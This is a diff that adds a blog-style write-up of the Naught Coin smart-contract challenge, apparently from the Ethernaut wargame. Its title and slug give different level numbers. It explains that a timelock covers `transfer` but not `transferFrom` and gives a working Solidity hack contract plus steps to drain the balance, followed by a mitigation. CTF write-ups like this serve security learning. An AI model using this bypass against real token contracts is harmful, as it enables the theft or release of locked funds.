@@ -1,0 +1,54 @@
+---
+title: Level 14 - Naught Coin
+slug: level-15
+published: 05-23-2023
+lastEdited:
+---
+
+## Objectives
+
+1. Empty all of your funds of an ERC20 token.
+
+## Vulnerabilities
+
+### Function modifier applied to transfer only
+
+This contract adds a timelock on the `transfer` function preventing you to transfer tokens within 10 years
+of the contract creation. On the other hand, the `transferFrom` function does not have the timelock implemented.
+
+## Exploit
+
+1. Write and deploy this simple hack contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./NaughtCoin.sol";
+
+contract NaughtCoinHack {
+
+    NaughtCoin target;
+
+    constructor(address _targetAddress) {
+        target = NaughtCoin(_targetAddress);
+    }
+
+    function hack() external {
+        bool success = target.transferFrom(0xcC5065Fa8f55F6929E1fA52E1ee6911F12C54a7F, address(this), 1000000000000000000000000);
+        require(success, "Transaction failed!");
+    }
+}
+```
+
+2. Approve your total balance as allowance for the above contract's address. (I used the Remix interface).
+
+3. Call the `hack` function which will transfer out all of your funds.
+
+## Suggested mitigation
+
+1. Override the `transferFrom` function with the timelock modifier.
+
+## Further reading
+
+- Open Zeppelin's ERC20 implementation <ExternalLink href={"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/9b3710465583284b8c4c5d2245749246bb2e0094/contracts/token/ERC20/ERC20.sol"} />
